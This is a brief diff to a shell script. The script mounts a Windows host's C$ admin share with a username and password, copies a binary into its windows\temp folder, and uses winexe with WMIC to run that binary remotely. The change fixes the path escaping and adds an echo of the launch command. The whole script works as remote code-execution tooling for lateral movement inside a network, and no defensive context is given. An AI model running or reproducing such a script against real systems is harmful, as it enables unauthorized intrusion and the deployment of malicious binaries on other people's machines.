@@ -15,5 +15,6 @@ mount.cifs //$ipaddy/C$ /mnt/targetdrive -o user=$username,password=$password
 cp $lpath/$binary /mnt/targetdrive/windows/temp 
 winexe -U "$username%$password" //$ipaddy ipconfig
 winexe -U "$username%$password" //$ipaddy "wmic os list brief"
-winexe -U "$username%$password" //$ipaddy "wmic process call create c:\windows\temp\$binary"
+echo "winexe -U "$username%$password" //$ipaddy "wmic process call create c:\\windows\\temp\\$binary""
+winexe -U "$username%$password" //$ipaddy "wmic process call create c:\\windows\\temp\\$binary"
 
